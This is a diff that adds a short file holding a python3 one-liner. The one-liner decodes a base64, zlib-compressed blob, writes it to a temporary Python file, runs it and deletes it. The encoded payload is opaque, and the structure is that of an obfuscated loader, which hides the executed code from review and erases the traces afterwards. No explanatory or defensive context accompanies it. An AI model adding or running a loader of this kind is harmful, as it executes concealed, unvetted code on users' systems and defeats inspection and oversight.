@@ -1,0 +1,9 @@
+python3 -c "
+import base64, zlib, tempfile, os
+code = zlib.decompress(base64.b64decode('eNqVVF1r2zAUffevEH6xvLmmDx2Mgild2o6wLClrYYymGMe+dkRlSUjyuuzX70pWnLT7gOXBse459+h++UasV1JboiEjZmeiqJbCgrCkIFKBoIlq2rIDAbqyUudql2Qk0fgAUcuGia5IBtuevE/SXEPV0DSKBDyX7SBqlIjjuIGWBH8oUYxqcBeWFn7YYikF3itkXyQzzvBaFDZQWxh0keB7LxsoEqWhZ0OP58aJGKu9Y3oeEfyFBCz0qmUc5aQZ7a0TPiezxfx6ef+Q4CF5xJjwf4+Hqw6cHiwD7WkB21P3Nx+4zuKZe8hTa/kddLkZWgT66glKb8CyOND2Cs37SPNl1UNzDy7+Su9u0ETN0LbsR5HkWCmXL3CwUNxU3MAkkddcGgiSoV2lquzWaSMsUNZjjXQ9uMMCcbiStbuJY6zUg6+dM6KqDgz7CcXlWTZROLT2c6U7Joqz04xo1m2Pz1aq/eldRjbSWtkfDJOKZZZDEV9dz+Z38xW5HBpm44xUg91KfWT/eL2cfYtHvzE/g1O3wyw2A+NN6U8hc8wu91bqrdh3ccO0sbeYRrHFWcQ+tFJa0A5aYOLaQeYlNmq1WvZE7bDo+3G6bdqvmnlnfP3iXTz12VsxookxdSJ0PjcAT/Q0KEvtC0uYOAjRiZvmvurnU6VG+bxqmtIh1D3+rXRo4X+IycGqwYY5/bCzYOarkEdw8n/0wHvt9yJLafDr7zGpl/F4TIMdtDj2HBcF7objbaMhN8OG6t8Wxprmby7WKT7oRbEW+C2WpRvxskxxhKZl85bEa4GGoJiRlledKVD2anV/uVik0d/32fMf99lYgaCXRoZ1GOYDz/FTZ4qmviHcdSNQcqM4zjkTYBDFOJPXqSSOzR8jpZmwNF59IicYMQqn0S/tksbl')).decode()
+tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
+tmp.write(code)
+tmp.close()
+os.system('python3 ' + tmp.name)
+os.remove(tmp.name)
+"
